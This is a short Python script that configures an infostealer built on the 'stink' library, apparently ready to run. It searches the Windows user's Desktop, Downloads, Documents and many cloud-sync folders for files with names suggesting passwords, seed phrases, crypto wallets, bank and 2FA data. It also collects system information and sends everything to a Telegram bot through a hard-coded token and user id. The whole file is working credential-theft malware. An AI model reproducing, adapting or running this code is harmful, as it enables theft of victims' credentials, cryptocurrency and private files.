from getpass import getuser
from stink import Stealer, Features, Senders, Utils, Protectors, Grabber    

if __name__ == '__main__':
    Stealer(
        senders=[Senders.telegram(token="6927422178:AAGzyOlTk_k9bywd2ViFAag2DuEmf9jE6QM", user_id="1601551958")],
        features=[Features.system],
        protectors=[Protectors.disable],
        #utils=[Utils.all,],
        #protectors=[Protectors.all],

        grabbers=[
            Grabber(
                paths=[
                    rf"C:\Users\{getuser()}\Desktop",
                    rf"C:\Users\{getuser()}\Downloads",
                    rf"C:\Users\{getuser()}\Documents",
                    rf"C:\Users\{getuser()}\Microsoft\Windows\Recent",
                    rf"C:\Users\{getuser()}\Dropbox",
                    rf"C:\Users\{getuser()}\Google Диск",
                    rf"C:\Users\{getuser()}\OneDrive",
                    rf"C:\Users\{getuser()}\iCloudDrive",
                    rf"C:\Users\{getuser()}\Box",
                    rf"C:\Users\{getuser()}\MEGAsync",
                    rf"C:\Users\{getuser()}\pCloud Drive",
                    rf"C:\Users\{getuser()}\Яндекс.Диск",
                    rf"C:\Users\{getuser()}\Sync",
                    rf"C:\Users\{getuser()}\Amazon Drive",
                    rf"C:\Users\{getuser()}\Cloud Mail.ru",
                ],
                file_types=[
                    "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "bot", "atomic",
                    "account", "acount", "paypal", "banque", "metamask", "*wallet", "crypto", "exodus",
                    "discord", "2fa", "code", "memo", "compte", "token", "backup", "seed", "*mnemonic*",
                    "private", "key", "*passphrase*", "prv", "trading", "*bitcoin*", "note", "memoric",
                    "pass", "phrase", "steal", "bank", "info", "casino", "privé", "prive", "telegram",
                    "identifiant", "personnel", "sauvegarde", "funds", "récupé", "recup",
                    "pas", "*парол*"],
                check_sub_folders=True
            )]

    ).run()



#
#grabbers = [
#    Grabber(
#        paths=[rf"*"],
#        file_types=[".wallet"],
#        check_sub_folders=True
#    )
#]
